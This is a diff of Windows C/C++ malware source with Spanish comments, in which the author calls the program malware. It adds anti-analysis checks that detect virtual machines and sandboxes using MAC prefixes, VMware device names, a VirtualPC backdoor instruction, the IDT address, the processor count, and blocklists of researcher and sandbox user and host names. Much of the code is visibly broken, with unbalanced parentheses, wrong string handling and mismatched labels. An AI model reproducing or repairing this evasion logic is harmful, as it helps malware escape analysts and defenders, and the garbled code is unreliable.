@@ -294,7 +294,7 @@ static DWORD WINAPI WAIT_SVTIME(LPVOID lpstart){
 		}
 		Exit(1);
 	}
-static BOOL CHECK_SPEC_VM_INFO(){
+static BOOL CHECK_SPEC_VM_INFO(){ //Módulo basado en el proyecto al-khaser y modificado por Tolaju para Laplace: https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM
 	
 	int FUNC_EXCEPTION = 0;
 	//OBTENER LAS MAC DE LA VM, SI NO FUERON CAMBIADAS, FUNCIONARÁ
@@ -328,9 +328,10 @@ static BOOL CHECK_SPEC_VM_INFO(){
          FUNC_EXCEPTION++;
          goto next_vmware_check1;
      }
-     const char* mac_blacklist{"00:05:69", "00:0c:29" , "00:1C:14" , "00:50:56", "08:00:27"}; //ENCRIPTAR DIRECCIONES MAC
+     const char* mac_blacklist{"00:05:69", "00:0c:29" , "00:1C:14" , "00:50:56", "08:00:27", 
+        "0a:00:27"}; //ENCRIPTAR DIRECCIONES MAC
      for(int i = 0; i < sizeof(mac_blacklist) / sizeof(mac_blacklist[0];i++){
-     	if(strcmp(MAC, mac_blacklist[i].c_str()) == 0) return TRUE;
+     	if(strcmp(MAC, mac_blacklist[i]) == 0) return TRUE;
      	}
     HeapFree(GetProcessHeap(),0,MAC);
     next_vmware_check1:
@@ -441,8 +442,148 @@ static BOOL CHECK_SPEC_VM_INFO(){
 		}
 	next_vmware_check3:
 	
+	const char* dispositivos = {"\\\\.\\vmci", "\\\\.\\HGFS"};
+	
+	int dlen = sizeof(dispositivos) / sizeof(dispositivos[0]);
+	
+	for(int dit = 0; dit < dlen; dit++){
+		HANDLE dev = CreateFile(dispositivos[dit], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if(!(CHECK_ALLOC_ERROR(2,2,TRUE,dev) return TRUE;
+		else continue;
+		}
+	//VirtualPC: Créditos: https://www.codeproject.com/Articles/9823/Detect-if-your-program-is-running-inside-a-Virtual
+	bool vpc = false;
+	
+	//Control de excepciones SEH (Excepiones a nivel de sistema operativo, no de C++ en si);
+	//NOTA: Aún no está confirmado que este código pueda ejecutarse en user mode, ya que hay varias posibles razones para que no pueda, pero lo dejaré de momento.
+	
+	#ifndef _WIN64
+    __try{
+		_asm push ebx
+        _asm mov  ebx, 0 
+        _asm mov  eax, 1 
+        _asm __emit 0Fh
+        _asm __emit 3Fh
+        _asm __emit 07h
+        _asm __emit 0Bh
+
+        _asm test ebx, ebx
+        _asm setz [vpc]
+        _asm pop ebx
+        
+	}
+	__except(VPC_EXCEPTION_HANDLER(GetExceptionInformation())){}
+	if(vpc) return TRUE;
+	#endif
+	/*
+	COMUNICACIÓN ENTRE MÁQUINA VIRTUAL Y MÁQUINA FÍSICA;
+	
+	Las máquinas virtuales necesitan una forma de contactarse con la máquina real, para que por ejemplo, cuando movemos nuestro;
+	ratón u otras cosas necesarias tanto a nivel de hardware como de software, también lo haga en la máquina virtual. 
+	El mecanismo de comunicación se llama interfaz de puerta trasera;
+	
+	ISA:
+	
+	ISA es un conjunto de instrucciones que detalla cuales instrucciones puede procesar la CPU (Procesador)
+	
+	VIRTUAL PC usa muchas instrucciones que no están en la ISA para el backdoor, y que siempre trata de controlar. 
+	
+	El código ensamblador tratará de activar un código no especificado en la ISA, y si VPC actúa en consecuencia, no habrá una excepción
+	pero si hay una excepción, normalmente quiere decir que VPC no ha actuado, por lo que no está.
 	
 	
+	*/
+	
+	
+	TCHAR username[UNLEN + 1];
+    DWORD size = UNLEN + 1;
+    GetUserName(username,&size);
+    
+    const char *blacklisted_names[] = 
+    {"jhon doe" , "sand box" , "current user" , "unknown" , "somebody" ,
+    "sand box" , "sandbox" , "user" , "malware" , "maltest" , "hacker" , "timmy" ,
+    "peter wilson" , "milozs" , "miller" , "johnson" , "it-admin" , "hong lee" , "lab" , "labs", "blue team" ,
+    "blue" , "hapubws" , "emily" , "analysis"};
+    
+    for(int uit = 0; uit < sizeof(blacklisted_names) / sizeof(blacklisted_names[0]); uit++){
+    	if(strcmp((tolower(username)), blacklisted_names[uit]) == 0){
+    	    return TRUE;
+    	    }
+    	}
+    
+    char *hostname = (char *)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, ((MAX_COMPUTERNAME_LENGHT) * 4)+1);
+    if(CHECK_ALLOC_ERROR(0,0,TRUE,hostname){
+    	FUNC_EXCEPTION++;
+        HeapFree(GetCurrentHeap(), 0, hostname);
+        goto blacklisted_check1;
+    	}
+    int CN_Handle = GetComputerName(hostname, MAX_COMPUTERNAME_LENGHT + 1);
+    if(CN_Handle == 0){
+    	FUNC_EXCEPTION++;
+        HeapFree(GetCurrentHeap(), 0, hostname);
+        goto blacklisted_check1;
+    	}
+    
+    char *dns_host = (char *)HeapAlloc(GetCurrentHeap(), HEAP_GENERATE_EXCEPTIONS, ((MAX_COMPUTERNAME_LENGHT) * 4)+1);
+    if(CHECK_ALLOC_ERROR(0,0,TRUE, dns_host)){
+    	FUNC_EXCEPTION++; 
+        HeapFree(GetCurrentHeap(), 0, hostname);
+        HeapFree(GetCurrentHeap(), 0, dns_host);
+        goto blacklist_check1;
+    	}
+    CN_Handle = GetComputerNameEx(ComputerNameDnsHostName, NULL, dns_host, (MAX_COMPUTERNAME_LENGHT + 1));
+    if(CN_Handle == 0){
+    	HeapFree(GetCurrentHeap(), 0, hostname);
+        HeapFree(GetCurrentHeap(), 0, dns_host);
+        goto blacklist_check1;
+    	}
+    const char* black_host[] = {"sandbox" , "7silvia" , "hanspeter-pc" , "john-pc" ,
+    "mueller-pc" , "win7-traps" , "tequilaboomboom" , "fortinet", "lab" , "labs" , "blue team" ,
+    "blue" , "hacker" , "unknown" , "user" , "malware" , "test" , "testing" , "username" , "somebody"};
+    
+    for(int hit = 0; hit < sizeof(black_host)/sizeof(black_host[0]);hit++){
+    	if(strcmp(tolower(hostname), black_host[hit]) != 0){
+    	    if(strcmp(tolower(dns_host), black_host[hit]) != 0) break;
+            else return TRUE;
+    	    }
+        else return TRUE;
+	    }
+    //Obtención de los nombres asociados al NetBIOS (Protocolo de red local) y de los nombres asociados al DNS local
+
+    blacklist_check1:
+    
+    
+    #ifndef _WIN64
+	PULONG num_poc = (PULONG)(__readfsdword(0x30) + 0x64);
+	#else
+	PULONG num_poc = (PULONG)(__readgsqword(0x60) + 0xB8);
+
+#endif
+
+    
+    if(*num_poc < 2) return TRUE;
+    
+    
+    /*
+    leer pointers donde se ubican las IDT (Tabla donde se almacenan vectores de interruptores, usados para responder a excepciones) del sistema operativo, cuyas direcciones se cambian en 
+    las máquinas virtuales. 
+    */
+    
+	
+
+	char idtr[6];
+	ULONG idt = 0;
+
+	//Almacenamos información sobre el IDT
+
+#ifndef _WIN64
+	_asm sidt idtr
+#endif
+	idt = *((unsigned long *)&idtr[2]);
+	
+	if((idt) >> 24) == 0xff) return TRUE;
+    
+    
 	if(FUNC_EXCEPTION != 0) Exit(1); //Explicación: Esta variable registra los fallos cometidos en las funciones, y salta al siguiente módulo para hacer que el malware sea lo más estable
                                                                //posible. Pero claro, si luego resulta que han dado negativo las pruebas, y nos hemos saltado módulos, pues no podremos asegurarnos de que haya VM o no, por lo que provocará una excepción;
     else return FALSE;                                                           
